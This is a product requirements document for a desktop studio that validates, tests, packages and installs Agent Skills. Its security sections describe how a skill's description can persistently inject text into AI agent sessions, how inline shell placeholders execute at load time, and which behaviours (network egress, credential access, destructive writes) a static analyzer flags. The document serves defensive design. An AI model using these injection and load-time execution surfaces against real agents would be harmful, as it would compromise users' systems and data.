# PRD — Agent Skill Studio

> A desktop studio for authoring, validating, testing, packaging, and installing
> [Agent Skills](https://agentskills.io) — the open standard originally from Anthropic.
>
> Status: decision-complete. Locked decisions recorded in §2.
> Normative spec source: https://agentskills.io/specification + `github.com/agentskills/agentskills`

---

## 1. Problem statement

The Agent Skills format has reached broad ecosystem adoption — the
[client showcase](https://agentskills.io/clients) lists 40+ agents (Claude Code, Codex,
Cursor, Copilot, Gemini CLI, OpenCode, Goose, Letta, and more). The format is stable and
documented. The **tooling around it is fragmented**, and research surfaced exactly two
disconnected halves:

| Half | Prior art exists | What it does | What it lacks |
|---|---|---|---|
| **Authoring** | VS Code *Agent Customizations* editor (Preview); Visual Studio 2026 Insiders *Skills panel*; `/create-skill` in Claude Code / Copilot | Scaffold `SKILL.md`, AI-generate a body, diff-review it | No validation gate, no testing, no packaging, no cross-client install |
| **Distribution** | [SkillPad](https://github.com/devxoul/skillpad) (Tauri GUI over `skills.sh` CLI); VS Code *Skills.sh* extension; `skills.sh`; `agentskill.sh` | Browse, install, remove, share | Read-only. Cannot create, validate, or test |

Consequences a user actually feels today:

1. **No correctness gate.** A skill that violates the spec fails *silently* at load time in
   some clients and *loudly* in others. The spec's own validator
   ([`skills-ref`](https://github.com/agentskills/agentskills/tree/main/skills-ref)) is
   published with the explicit warning: *"This library is intended for demonstration
   purposes only. It is not meant to be used in production."* There is no production-grade
   validator in any language.
2. **"Testing" a skill is undefined and undiscoverable.** A skill is mostly prose. The
   official guide ([evaluating-skills](https://agentskills.io/skill-creation/evaluating-skills))
   defines a rigorous eval-driven methodology and a concrete on-disk contract
   (`evals/evals.json`, `iteration-N/…/grading.json`, `benchmark.json`) — but it is
   **paper-only**. Nothing executes it. Users cannot tell whether a skill helps or hurts.
3. **No safe path from "a folder" to "installed".** `SKILL.md` must match its parent
   directory name, and skills must land in one of several client-specific paths. Getting
   this wrong produces a skill that simply never loads.
4. **Import is a security decision with no tooling.** A skill folder is executable code
   (`scripts/`) plus prose that is injected into *every* future session's context (the
   `description` is loaded at startup, ~50–100 tokens per skill, unconditionally). Importing
   an unvetted skill is currently an act of faith.

**The product:** one desktop application that carries a skill across the whole lifecycle —
**author → validate → test → package → install → import** — with a spec-conformant core and
an honest security model.

---

## 2. Locked decisions

Confirmed with the user before planning. These are **not** re-opened by the implementer.

| # | Decision | Choice | Consequence |
|---|---|---|---|
| D1 | Delivery form | **Tauri v2 desktop app** | Direct filesystem R/W to client skill paths; can spawn sandboxed child processes; ships as an installable binary. Costs a Rust build layer (mitigated: thin Rust, §4.1). |
| D2 | Stack | **Python backend (FastAPI) + TypeScript/React frontend** | Puts the runtime where the reference validator, the eval contract, and the agent SDKs already live. Costs an IPC boundary (mitigated: generated contract, §4.7). |
| D3 | Test scope | **L1 structural + L2 sandboxed script execution + L3 LLM eval loop** | The only option that makes "test" mean something. Costs real complexity in L2/L3 (mitigated: §4.5, §4.6, and the §9 spike). |
| D4 | Publish target | **Local install to client paths + reproducible artifact export** | No hosted registry, no external-registry push. Import still reads from external sources (§4.4). Keeps scope to a single-machine tool. |

---

## 3. Goals / non-goals

### Goals

- **G1** — A validator that is production-grade, spec-conformant, and reports
  *actionable, located* diagnostics (severity + file + span + suggested fix), across two
  profiles: `strict` (the spec as written) and `lenient` (what real clients actually load).
- **G2** — Implement the official eval contract on disk exactly as specified, and execute
  it end-to-end: A/B run with/without skill, assertion grading, benchmark aggregation.
- **G3** — Byte-reproducible skill artifacts with a checksum manifest, installable to any
  supported client path, atomically and reversibly.
- **G4** — Import from any source (folder, archive, git, public registry API) through a
  mandatory validation + trust gate. No unvalidated skill ever reaches a live skills path.
- **G5** — Provider-agnostic. The standard is provider-agnostic; the studio must not
  hard-code one model vendor.
- **G6** — A UI fast enough to be the *only* tool a user needs for a skill's whole life.

### Non-goals (v1)

| Non-goal | Why excluded |
|---|---|
| Hosted skill registry / public publishing backend | D4. Re-visit post-v1. |
| Push to `skills.sh` / `agentskill.sh` / AIPM | D4. Import-only is sufficient. |
| A general-purpose agent runtime | We consume runtimes, don't build one. |
| Plugin manifests (`.claude-plugin/`, `.codex-plugin/`, `.cursor-plugin/`, `mcp.json`) | Observed in the wild (e.g. `seranking/seo-skills` ships all of them) but **not part of the agentskills.io spec**. v2. |
| Cursor `.mdc` rules authoring | Different format, different product. Import-compatible only. |
| Multi-user / cloud sync | Single-machine desktop tool. |
| Mobile | Out of scope. |

---

## 4. Architecture

### 4.0 Component map

```
┌─────────────────────────────────────────────────────────────────┐
│  Tauri v2 shell (Rust)                                          │
│  window lifecycle · sidecar supervision · native dialogs       │
│  privileged fs ops · capability-based permissions               │
│  ⚠ thin: no business logic                                     │
└───────────────┬─────────────────────────────────────────────────┘
                │ versioned JSON over stdio / unix socket
┌───────────────▼─────────────────────────────────────────────────┐
│  Python core (FastAPI, py≥3.11)  — single source of truth       │
│                                                                  │
│  ┌────────────┐  ┌────────────┐  ┌──────────────────────────┐   │
│  │ spec-core  │  │ skill-io   │  │ packager  │  installer  │   │
│  │ schema     │  │ import     │  │ artifact  │  targets    │   │
│  │ parse      │  │ adapters   │  │ manifest  │  atomic     │   │
│  │ validate   │  │ path-safe  │  │ checksum  │  precedence │   │
│  │ diagnostics│  │            │  │           │  │           │   │
│  └─────┬──────┘  └─────┬──────┘  └─────┬─────┘  └─────┬─────┘   │
│        │               │               │              │         │
│  ┌─────▼───────────────▼───────────────▼──────────────▼─────┐   │
│  │ test-engine                                            │   │
│  │  L1 validator  ·  L2 analyzer + sandbox  ·  L3 eval     │   │
│  └────────────────────────┬─────────────────────────────────┘   │
│                           │                                     │
│  ┌────────────────────────▼─────────────────────────────────┐   │
│  │ agent adapters (L3)  — Claude · OpenAI-compatible · Mock │   │
│  └──────────────────────────────────────────────────────────┘   │
└───────────────┬─────────────────────────────────────────────────┘
                │ typed IPC
┌───────────────▼─────────────────────────────────────────────────┐
│  React 19 + TS + Vite (CodeMirror 6)                             │
│  Editor · FileTree · DiagnosticsPanel · TestRunnerView           │
│  ReportView (grading + benchmark) · ImportDialog · PackageDialog │
└─────────────────────────────────────────────────────────────────┘
```

### 4.1 Why each technology was chosen

Every choice below is justified against a named alternative.

#### Tauri v2 (Rust shell)

**Chosen.** The app's core operations are privileged and local: read/write
`~/.agents/skills/`, `~/.claude/skills/`, `~/.github/copilot/skills/`; spawn and supervise
child processes for L2; read/write user-chosen directories during import.

| Criterion | Tauri v2 | Electron | Rationale |
|---|---|---|---|
| Bundle size | ~10–15 MB | ~150 MB | Desktop app that users install once and keep. |
| Privileged ops | Native Rust + capability ACL | Node in renderer (must be `contextIsolation`-hardened) | Tauri v2's capability model is allowlist-by-default — the correct posture for an app that executes third-party code. |
| Child-process control | Native `std::process` + `tauri-plugin-shell` | Available via Node | Equal. |
| Ecosystem fit | SkillPad (`devxoul/skillpad`) already ships a Tauri skills GUI; `bun run tauri build --target universal-apple-darwin` | — | Prior art de-risks the shape. |

**Consequence accepted:** the project gains a Rust build layer. **Mitigation:** Rust is
confined to `src-tauri/` and contains only (a) sidecar lifecycle, (b) native file dialogs,
(c) the narrow set of filesystem mutations that must bypass the Python boundary, (d) the
IPC router. It is estimated at <800 LOC and contains no domain logic. Every rule about what
is *valid* lives in Python.

#### Python ≥3.11 (FastAPI sidecar)

**Chosen.** Four independent reasons, any one of which would suffice:

1. **Differential-test parity.** The reference validator `skills-ref` is Python and parses
   YAML with **`strictyaml`** (strict YAML 1.2: rejects duplicate keys, unquoted colons, and
   other YAML that permissive parsers silently accept). To prove our validator is
   conformant, the ideal test is to run both on one corpus **in one process**. That is only
   cheap in Python. (We still do not *depend* on it — see §4.3.)
2. **The eval contract is Python-shaped.** `evals/evals.json`, `grading.json`,
   `timing.json`, `benchmark.json`, `feedback.json` are the documented artifacts. Pydantic v2
   gives discriminated unions and exact-schema JSON Schema generation for free, and §4.7
   depends on that generation.
3. **Agent runtime availability.** The L3 runner needs an agent that can be *isolated per
   run*. The docs note isolation "comes naturally" in environments with subagents
   (Claude Code / Agent SDK), and note it must otherwise be obtained via separate sessions.
   The mature options are Python-first.
4. **PEP 723 is a first-class part of the spec.** The official *Using scripts* guide makes
   inline dependency metadata (`# /// script`) the recommended way to bundle a
   self-contained script, run via `uv run`. The L2 sandbox runner must therefore speak
   `uv`/`pipx`/`npx`/`bunx`/`deno` — a Python-adjacent toolchain. Building the studio in
   TypeScript would mean *not* being able to run the ecosystem's own documented script
   invocation path as a first-class citizen.

**Why a sidecar process rather than embedded (PyO3/maturin)?**

| Concern | Sidecar | Embedded (maturin) |
|---|---|---|
| Build matrix | One Python wheel per platform/version, decoupled from Rust | Rust ↔ CPython ABI coupling; rebuild on every Python bump |
| Headless CI | ✅ `pytest` runs the entire core with no GUI, no Rust build | ❌ Core is unreachable without compiling the extension |
| Debug iteration | ✅ Backend restarts independently of the window | Slow full rebuild |
| Cost | IPC serialization | Marshalling + GIL |

The core is business logic with a hard requirement to be testable without a GUI. A sidecar
wins decisively. The IPC tax is paid down by generating the contract (§4.7).

**Why not Rust for the core?** Rejected: §4.1 reason 4 (must drive `uv`/PEP 723), and the
LLM-provider + agent-SDK ecosystem is Python-first. Rust would mean hand-writing the eval
harness against raw HTTP with no SDK.

#### React 19 + TypeScript + Vite + CodeMirror 6

**Chosen.** The UI is a *document* editor with structural overlay: a `SKILL.md` editor that
must show YAML frontmatter, live diagnostics keyed to line/column, a multi-file tree, diff
views, and streaming test output.

- **React + Vite** — the only mature ecosystem for this class of UI. Vite's dev loop keeps
  Tauri rebuilds out of the inner loop (HMR in the webview, Rust rebuilds only on IPC
  change). Directly relevant: SkillPad uses exactly `bun` + Vite + Tauri and reports a
  smooth `bun run dev`.
- **CodeMirror 6** over Monaco/Monaco-based editors — CM6 is ~⅓ the bundle, has a first-class
  YAML + Markdown language stack, and supports lint-gutter diagnostics, which is precisely
  the interaction this product needs (an error underline in the editor, not a separate panel
  the user must cross-reference).
- **TypeScript strict** — the frontend consumes generated types from the Python contract, so
  an IPC shape change is a compile error, not a runtime crash.

#### Pydantic v2 for all contract types

Chosen over dataclasses + hand-rolled validation because §4.7 needs **JSON Schema emission**
and because the eval contract has genuinely nested optional structures
(`assertions[]`, `files[]`, `run_summary.delta`) where hand-rolled validation drifts.
Pydantic v2 is Rust-backed, so validation cost is not a concern.

### 4.2 Component: `spec-core` — schema, parsing, validation (L1)

The authoritative, single source of truth for what a valid skill is.

**Frontmatter field set (from the spec):**

| Field | Required | Constraint |
|---|---|---|
| `name` | ✅ | 1–64 chars; unicode lowercase alphanumeric + `-`; no leading/trailing `-`; no `--`; **must equal parent directory name** |
| `description` | ✅ | 1–1024 chars, non-empty |
| `license` | — | string |
| `compatibility` | — | ≤500 chars, string |
| `metadata` | — | flat `str → str` map |
| `allowed-tools` | — | space-separated string (spec marks **experimental**) |

**Any other top-level frontmatter key is an error.** The reference implementation enforces
exactly this closed set — verified in
`skills-ref/src/skills_ref/validator.py::ALLOWED_FIELDS`. This is a common authoring
mistake (people add `version:` or `author:` at top level instead of under `metadata`) and a
prime diagnostic to surface with a fix-it.

**But "unknown" is not a single category, and treating it as one produces wrong advice.**
Claude Code documents **14 skill-frontmatter fields that are not in the spec** — verified in
its *Frontmatter reference*:

| Non-spec field | Effect |
|---|---|
| `when_to_use` | Extra trigger context; **appended to `description`** in the skill listing |
| `disable-model-invocation` | `true` ⇒ Claude never auto-loads the skill |
| `user-invocable` | `false` ⇒ hidden from the `/` menu; model-only |
| `argument-hint` | Autocomplete hint |
| `arguments` | Named positional `$name` substitution |
| `disallowed-tools` | Tools removed from the pool while the skill is active |
| `model` / `effort` | Per-skill model / effort override |
| `context: fork` | Run in a forked subagent context |
| `agent` / `background` | Subagent type; background vs awaited |
| `hooks` | Registers hooks that **keep running for the rest of the session** |
| `paths` | Glob patterns gating auto-activation |
| `shell` | `bash` (default) or `powershell` for inline command execution |

A skill carrying `context: fork` is **invalid per spec** yet **fully functional in Claude
Code**. So the validator maintains a **known-extension registry** and classifies an
unrecognized key into one of three outcomes:

| Classification | `strict` severity | Message |
|---|---|---|
| Known spec field | — | valid |
| Known **client extension** | `error` (it *is* a spec violation) | *"Non-standard field `context`. Honored by Claude Code; ignored by other clients. Move under `metadata` for portability."* |
| Genuinely unknown | `error` | *"Unknown field `version`. Not in the spec and not a known client extension. Use `metadata.version`."* |

The distinction is the whole point: the first is a **portability** problem, the second is a
**typo**. Reporting both as "unexpected field" — which is what `skills-ref` does — is what
makes authors delete working Claude Code skills. (This is a declared, justified divergence
from the reference validator; §4.3.)

**Two further spec-vs-reality gaps the studio must report rather than resolve silently:**

1. **`name` is required by the spec but optional in Claude Code** (it defaults to the
   directory name). So a missing `name` is a spec error that many clients tolerate. Reported
   as an `error` in `strict` with a note that the directory name is used as a fallback.
2. **Two different description budgets.** The spec caps `description` at 1024 characters;
   Claude Code truncates the combined `description` + `when_to_use` at **1,536 characters**
   in the skill listing. The studio checks both and names which one a given skill is
   approaching, because a skill that passes spec validation can still be silently truncated
   in a real client.

**Verified reference behaviors we must reproduce** (from `validator.py` / `parser.py`):

- `name` is **NFKC-normalized** before comparison, and compared to the **NFKC-normalized
  parent directory name**.
- `name` character check is `c.isalnum() or c == '-'` — **`isalnum()` is Unicode-aware**, so
  non-ASCII letters are legal. The reference docstring says so explicitly: *"Skill names
  support i18n characters (Unicode letters) plus hyphens."* A validator that hard-codes
  `[a-z0-9-]` would be **wrong** and would reject valid Korean/Japanese skill names. The
  spec's prose ("lowercase letters, numbers, and hyphens") is narrower than the reference
  implementation; the studio follows the reference implementation and reports this
  divergence explicitly as a `spec-ambiguity` diagnostic rather than silently choosing.
- `compatibility`, if present, must be a **string** (not a number/bool) and ≤500 chars.
- `metadata` values are coerced to `str`.
- File discovery accepts `SKILL.md` and falls back to lowercase `skill.md`.
- Parse errors are distinct from validation errors: missing opening `---`, unterminated
  frontmatter, YAML syntax error, frontmatter that is not a mapping.

**Two validation profiles:**

| Profile | Behavior | Use |
|---|---|---|
| `strict` | Full spec enforcement. Unknown keys = `error`. Name/dir mismatch = `error`. | Gate before package/install/publish. |
| `lenient` | Mirrors what real clients do per the official client-implementation guide: warn-and-load on cosmetic issues (name≠dir, name >64), **skip** only when `description` is missing/empty or YAML is unparseable. | Compatibility checking / import triage. |

Both profiles share one rule engine with a per-rule severity map — not two implementations.

**Beyond the spec (advisory rules, `warn` only).** These are the failure modes the official
best-practices guide describes, promoted to lints:

- Body >500 lines or >~5000 tokens (spec recommends against it).
- No `references/`-or-`assets/` split despite a very long body.
- Relative file references in the body that **do not resolve** on disk (spec: *"Keep file
  references one level deep"*). This is a real breakage class and is statically checkable.
- Referenced executables that look like bundled scripts but aren't in `scripts/`.
- `description` that is syntactically present but semantically weak (no trigger keywords) —
  ties to the official *Optimizing skill descriptions* guidance.
- Empty `description` for skills in a directory scan.

**Output:** a `Diagnostic` stream, not a boolean — `{severity, code, message, path?, span{start,end}, fix?}`. The UI renders these as editor gutter annotations, a filterable panel, and (for headless/CI use) a JSON/SARIF-style report.

### 4.3 Component: validator strategy — reimplement, then differential-test

**Decision: implement validation natively. Do *not* take a runtime dependency on `skills-ref`.**

Evidence: its own README carries the banner
`> [!IMPORTANT] This library is intended for demonstration purposes only. It is not meant to be used in production.`
It is a teaching artifact; it also returns `list[str]`, which cannot express severity,
location, or a suggested fix — the three things that make a validator usable in an editor.

**But treat it as an executable oracle.** Because the rules live *only* in that Python code
(the repo ships **no JSON Schema** — verified: the tree contains `docs/`, `skills-ref/`, and
no schema file), conformance must be *tested*, not assumed.

**Conformance strategy (Phase 1 deliverable):**
1. Vendor `skills-ref` as a **`[dev]`-only** dependency, pinned to `0.1.1`.
2. Build a **fixture corpus** of ≥60 skill directories covering every rule and every edge
   case: valid minimal; each single-field violation; unicode names; `name`≠dir; unknown
   frontmatter keys; `metadata` with non-string values; `compatibility` as a number;
   lowercase `skill.md`; missing `---`; unterminated frontmatter; unquoted-colon descriptions
   (the compat hazard the client guide calls out); body with unresolvable relative links;
   600-line body; and a set of real-world skills harvested from the public ecosystem.
3. Run **both** validators over the corpus; assert our verdict matches, and where it
   deliberately diverges (lenient profile, unicode, `str` coercion) assert the divergence is
   *declared* in a known-divergence list with a written justification.
4. Run it in CI. **Spec drift is then a red build, not a silent bug** — which is the entire
   reason the reference implementation's rules had to be read directly.

### 4.4 Component: `skill-io` — import, export, path safety

**Import sources (v1):**

| Source | Mechanism |
|---|---|
| Local directory | Direct read; user picks via native dialog |
| Local archive | `.tar.gz` / `.zip` produced by our packager (§4.8) |
| Git | `owner/repo` + optional subpath, shallow clone to a temp dir |
| Registry API | `agentskill.sh`: `GET /api/agent/skills/{owner%2Fslug}/install` → `{skillMd, skillFiles[{path,content}], installPath}` |
| GitHub path | `owner/repo` + path, via raw/API fetch (the pattern `aiagentsdirectory.com` documents for `anthropics/skills`) |

**Every import — without exception — follows the same pipeline:**

```
source → STAGING (never the live path) → path-safety scan → L1 validate (strict)
       → trust gate (human decision, informed by report) → atomic install
```

**Path-safety scan** (before anything touches disk outside staging): reject `..` traversal,
absolute paths, symlinks escaping staging, and `SKILL.md` absent at the expected depth;
normalize and cap total unpacked size and file count; strip setuid/setgid bits.

**Trust gate — and the specific threat it addresses.** The studio must state, in the UI,
that importing a skill has two distinct exposure surfaces:

1. **Executable** — `scripts/` runs when the host agent decides to run it.
2. **Context injection** — the `description` field is injected into **every future session's
   catalog** (tier-1 progressive disclosure, ~50–100 tokens, loaded unconditionally at
   startup for every installed skill). A malicious `description` is a persistent injection
   vector that does not require the skill to ever be activated. The official client guide
   makes the analogous point about project-level skills arriving from untrusted clones.

The gate therefore blocks install on any `strict` error, and requires explicit confirmation
when static analysis of `scripts/` flags network egress, credential access, or destructive
filesystem operations.

**Export / portability.** Export writes a §4.8 artifact. Skills are *already* directories and
the spec deliberately does not mandate location, so export is lossless by construction —
no lossy conversion step exists to get wrong.

### 4.5 Component: L2 — `script-analyzer` + `sandbox-runner`

A skill's `scripts/` is untrusted code. This is the highest-risk component and the one with
the least settled evidence; it is scoped conservatively and gated behind a spike (§9).

> **The body is executable too — this was nearly missed.** Claude Code's *Inject dynamic
> context* documents that a `` !`<command>` `` placeholder **runs a shell command before the
> skill content is sent to the model**, substituting the output in place of the placeholder;
> a fenced block opened with ` ```! ` does the same for multi-line commands. A skill body is
> therefore an **arbitrary-code-execution surface with no `scripts/` directory involved**,
> and it is the *more* surprising one, because a body is prose by appearance.
>
> Confirmed mitigations exist but are **not** under the skill author's control:
> `"disableSkillShellExecution": true` in settings (a *host* policy; authors cannot set it,
> and bundled/managed skills are exempt), and non-execution for skills synced from a
> claude.ai account. A local third-party skill gets neither protection by default.
>
> **Consequence:** `script-analyzer`'s remit is widened from "scan `scripts/`" to **"scan
> the whole skill for executable surface"** — body placeholders, fenced `!` blocks,
> `hooks` (which persist for the session), `allowed-tools` / `disallowed-tools` (which
> pre-approve or remove tools), and the `shell` selector. This is a static, zero-execution
> check and therefore belongs in the default-on path, not behind the opt-in sandbox.

**`script-analyzer` (static, default-on, zero execution).** For every file in `scripts/`
(and any file elsewhere in the skill with a shebang or executable bit): detect interpreter
from shebang; extract declared dependencies (PEP 723 `# /// script` block, `package.json`,
`requirements.txt`, `go.mod`, `Gemfile`); flag network egress primitives, credential/env
access, filesystem writes outside the skill root, subprocess spawning, and `eval`/`exec`.

Body-level checks, added per the finding above:

| Check | Detects |
|---|---|
| `body-shell-exec` | `` !`cmd` `` and ` ```! ` blocks → an inline command that will run at load time |
| `session-persistent-hook` | a `hooks` frontmatter field → code registered for the session's remainder |
| `tool-preapproval` | `allowed-tools` → tools pre-granted without a permission prompt |

The placeholder syntax has a precise trigger rule worth encoding exactly, because a naive
regex over-fires: the inline form is recognized only when `!` begins a line or immediately
follows whitespace — so `KEY=!`cmd`` is left as literal text and does **not** run.
Substitution also runs **once** over the original file, so a command's output cannot itself
expand a further placeholder. The analyzer should state this rather than imply
transitive expansion.

Result is a capability report shown **before** the user opts into execution — and reused by
the trust gate in §4.4.

**`sandbox-runner` (dynamic, opt-in, default-off).** Rationale: a desktop app that executes
arbitrary downloaded code with the user's own privileges is a malware delivery mechanism.
We do not ship that as a default.

| Control | Enforcement |
|---|---|
| Network | Denied by default. Allowlist only on explicit per-run user consent. |
| Filesystem | Skill dir read-only bind mount; outputs to a `tmpfs` scratch dir. No host `$HOME`. |
| Identity | Non-root UID, no supplementary groups, dropped capabilities. |
| Resources | Hard wall-clock timeout, memory cap, CPU cap, PID cap, output-size cap. |
| Process | No `--privileged`, no host devices, no host mounts, no Docker socket. |
| Observability | Full stdout/stderr captured, persisted with the run for post-hoc review. |

**Deliberately out of scope for v1:** an LLM-driven agent loop that *chooses* which scripts
to run. v1 runs a user-selected script with user-supplied arguments. Auto-execution is a v2
feature and is the component that would need a real adversarial-safety review.

### 4.6 Component: L3 — `eval-engine` (the differentiator)

Implements the official eval methodology and on-disk contract **as specified**, so that a
skill written against the docs works in the studio with no conversion.

**`evals/evals.json` — the input contract** (authored by the user):

```json
{
  "skill_name": "csv-analyzer",
  "evals": [
    {
      "id": 1,
      "prompt": "I have a CSV of monthly sales data in data/sales_2025.csv. Can you find the top 3 months by revenue and make a bar chart?",
      "expected_output": "A bar chart image showing the top 3 months by revenue, with labeled axes and values.",
      "files": ["evals/files/sales_2025.csv"],
      "assertions": ["The output includes a bar chart image file", "Both axes are labeled"]
    }
  ]
}
```

**Workspace layout — produced exactly as documented**, because the docs describe it as the
contract between a person and their future self:

```
<skill>-workspace/
└── iteration-1/
    ├── eval-<slug>/
    │   ├── with_skill/{outputs/, timing.json, grading.json}
    │   └── without_skill/{outputs/, timing.json, grading.json}   # or old_skill/ when baselining a prior version
    ├── benchmark.json
    └── feedback.json
```

**Run isolation.** Each run starts from a **clean context** so the agent follows only
`SKILL.md` and not residue from the authoring session. Implemented as a fresh agent session
per run. Where the adapter supports subagents (Claude), a subagent *is* the isolation
primitive.

**Two-run A/B is mandatory.** Every case runs with the skill and without it (or against a
snapshot of the previous version, snapshotted before editing). A single run is not a result;
the delta is the result.

**Grading is a hybrid pipeline, in this order** — because the official guidance is explicit
that *"scripts are more reliable than LLM judgment for mechanical checks"*:

1. **Deterministic checkers** (default): does the file exist; is it valid JSON; does it parse
   as CSV; is the image ≥ N×M; does the text contain a required heading; row/count equality
   against `expected_output` where computable.
2. **LLM judge** (only for assertions no checker can express): given the outputs and the
   assertion, return `PASS`/`FAIL` **plus quoted evidence**. The docs' grading rule is
   explicit: *"Require concrete evidence for a PASS. Don't give the benefit of the doubt."*
   A PASS without a quotable span is downgraded to `FAIL`/`UNVERIFIABLE`.
3. **Human feedback** — the docs are equally explicit that assertions cannot cover
   everything (*"writing style, visual design, whether the output 'feels right'"*), so
   `feedback.json` is a first-class editor, not an afterthought.

**`grading.json`** — per the documented shape: `assertion_results[]` with
`{text, passed, evidence}` and a `summary {passed, failed, total, pass_rate}`.

**`timing.json`** — `{total_tokens, duration_ms}`, captured from the run. The docs flag
that these values are *not persisted anywhere else* and must be recorded immediately; the
studio records them as a side effect of the run, not as a user step.

**`benchmark.json`** — aggregates `pass_rate`, `time_seconds`, and `tokens` as
`{mean, stddev}` per arm plus a `delta`, so the UI can answer the only question that
matters: *what did the skill cost, and what did it buy?* When only one run per case exists,
the UI must say so rather than presenting a meaningless `stddev` — the docs flag this
explicitly.

**Built-in analysis the docs prescribe, surfaced as UI insight** (not left to the user):
assertions that pass in *both* arms (noise — inflate the score); assertions that fail in
*both* arms (probably broken assertions); assertions that pass only *with* the skill (the
skill's actual value); high `stddev` across repeats (flaky prompt or ambiguous instructions).

**Provider adapters — G5.** A `RunAdapter` protocol, with a `MockAdapter` (canned
transcripts, zero cost, **required for CI**) plus at least two real providers. Because the
standard is provider-agnostic and the studio must be too, the adapter boundary is a
first-class interface, not a `if provider ==` branch. The `MockAdapter` is what makes AC-2.6
runnable in CI without network or an API key.

### 4.7 Component: `ipc-contract` — one schema, three languages

The Tauri↔Python↔TS boundary is the main structural risk of D2.

- Python Pydantic models are the **single definition**. The contract is emitted as **JSON
  Schema**, from which **TypeScript types are generated**. The frontend never hand-writes a
  wire type; the backend never hand-writes a serializer.
- Contract is **versioned** (`contractVersion` in the handshake). Mismatch is a clear,
  actionable startup error — not a `KeyError` three layers deep.
- Transport: stdio for the sidecar's stdio streams, a **unix domain socket** for request/response
  (long-lived, binary-safe, no port allocation or firewall prompt).
- **All request/response payloads are validated at the boundary in both directions.** An
  internal model never crosses the wire unvalidated.

### 4.8 Component: `packager` — reproducible artifact

**Format: deterministic `.tar.gz`.** Chosen over ZIP (weaker mtime/permission control) and
over OCI/npm (adds a resolver and a registry dependency the format does not need — a skill
is a directory, and the spec deliberately does not define a distribution format).

Reproducibility requires pinning everything that would otherwise vary:

- Entries **sorted by path**; fixed mtime; `uid=gid=0`, numeric owner; normalized modes
  (dirs `0755`, files `0644`, `scripts/**` preserved as `0755` only if the source was
  executable); `--no-acls --no-xattrs`; fixed gzip level and no embedded filename/timestamp.
- **A `manifest.json` beside the archive** (not inside it) recording: content hash per file,
  the full-tree hash, `name`, `specVersion`, `createdWith`, `license`, and the
  `compatibility` string if present.
- **Same input ⇒ byte-identical archive**, asserted by a test that builds twice and compares
  digests. Reproducibility that is not tested is a claim, not a feature.

`manifest.json` lives *outside* the archive so that identity/hash inspection never requires
extraction.

### 4.9 Component: `installer` — targets, precedence, atomicity

**Target paths** (from the official client guide's discovery table, plus observed client
conventions):

| Scope | Path | Note |
|---|---|---|
| Project (cross-client) | `<project>/.agents/skills/` | The guide calls this the cross-client interoperability convention |
| Project (client-native) | `<project>/.claude/skills/`, `.cursor/skills/`, `.github/copilot/skills/`, `.codex/skills/` | |
| User (cross-client) | `~/.agents/skills/` | |
| User (client-native) | `~/.claude/skills/`, `~/.cursor/skills/`, `~/.codex/skills/`, `~/.windsurf/skills/` | |

**Precedence** — the guide's universal convention is **project-level overrides user-level**,
and collisions must be *logged, not silently resolved*. The installer surfaces a shadowing
warning in the UI; it must never quietly pick a winner.

**Atomicity.** Install = write to a sibling temp dir → validate *at the destination* → atomic
rename into place. A failed install leaves the previous version intact and the live skills
path untouched. Uninstall is the inverse and must be safe to interrupt.

**Client-specific install hazards** (verified against Claude Code's documented behavior) that
a naive installer gets wrong:

| Hazard | Rule |
|---|---|
| **Reserved names** | `synced` and `anthropic-skills` (and the `anthropic-skills:` namespace) are reserved. A skill with one of these names **silently does not load**. The installer must refuse, or warn at minimum — this is precisely the "installed but invisible" failure class. |
| **`~/.claude/skills/synced/` is owned by claude.ai sync** | Never write there. Local edits are overwritten by the next sync; deletion by hand causes re-download. |
| **Symlinked skill folders are legitimate** | A skill entry may be a symlink to a directory elsewhere. Discovery must not choke, and must not treat the symlink target as an escaping path (contrast §4.4, where *archive* symlinks are rejected — the trust posture differs because one is user-authored and one is attacker-supplied). This asymmetry must be explicit in the code and comments. |
| **Skill-as-plugin** | A folder containing `.claude-plugin/plugin.json` loads as a plugin and needs a workspace trust dialog first. Out of scope to author (v2), but the installer must detect and warn rather than mis-report activation. |
| **Nested/parent discovery** | Project skills load from `.claude/skills/` in the start directory **and every parent up to the repo root**. "Installed" verification must check the location the *user's* session would actually start from. |

**Post-install verification.** After install, the studio re-runs discovery exactly as a real
client would (scan the target, look for subdirectories containing `SKILL.md`) and confirms
the skill is actually visible **and not shadowed and not reserved-named**. "Installed" must
mean "a client will find it," not "we wrote some bytes."

---

## 5. Data model (core types)

| Type | Source | Notes |
|---|---|---|
| `SkillFrontmatter` | Pydantic (authoritative) | `name`, `description`, `license?`, `compatibility?`, `metadata: dict[str,str]`, `allowed_tools?` (⚠ YAML key is `allowed-tools`; the reference dataclass exposes `allowed_tools` — our model must map hyphen↔underscore explicitly, a real bug source) |
| `SkillDocument` | Pydantic | `frontmatter` + `body: str` + `path` + `dir_name` |
| `Diagnostic` | Pydantic | `severity{error,warn,info}`, `code`, `message`, `path?`, `span{start,end}?`, `fix?` |
| `EvalSuite` | Pydantic | `skill_name`, `evals: list[EvalCase]` — mirrors `evals/evals.json` |
| `EvalCase` | Pydantic | `id`, `prompt`, `expected_output`, `files: list[str]`, `assertions: list[str]` |
| `ArmResult` | Pydantic | `outputs: list[str]`, `timing: Timing`, `grading: Grading` |
| `Timing` | Pydantic | `total_tokens: int`, `duration_ms: int` |
| `Grading` | Pydantic | `assertion_results: list[AssertionResult]`, `summary` |
| `Benchmark` | Pydantic | `run_summary: {with_skill, without_skill, delta}`, each `{pass_rate, time_seconds, tokens}` as `{mean, stddev}` |
| `ArtifactManifest` | Pydantic | file hashes, tree hash, `name`, `specVersion`, `license?`, `compatibility?` |
| `RunAdapter` | Protocol | `run(task, skill_dir\|None, output_dir) -> ArmResult` — the provider seam (G5) |

---

## 6. Acceptance criteria (testable — this is Ralph's completion definition)

### AC-1 — Validation (L1)
- **AC-1.1** A minimal valid skill (only `name` + `description`) passes `strict` with zero diagnostics.
- **AC-1.2** Each of the 6 spec constraints is individually enforced: `name` absent, `description` absent/empty/>1024, `name`>64, `name` with leading/trailing `-`, `name` with `--`, `name`≠parent-dir, `compatibility`>500. Each yields a distinct diagnostic `code`.
- **AC-1.3** An unknown top-level frontmatter key is an `error` under `strict` and the diagnostic `fix` names `metadata` as the correct location.
- **AC-1.3a** A **known client extension** (any of the 14 Claude Code fields) produces a *different* diagnostic `code` and message than a genuinely unknown key, naming the honoring client and the portability cost. Both remain `error` under `strict` (this is a declared divergence from `skills-ref`, on the known-divergence list).
- **AC-1.3b** A skill whose `description` + `when_to_use` exceeds 1,536 characters produces a distinct `truncation-risk` diagnostic citing the 1,536-char client budget, separately from the spec's 1,024-char `description` cap.
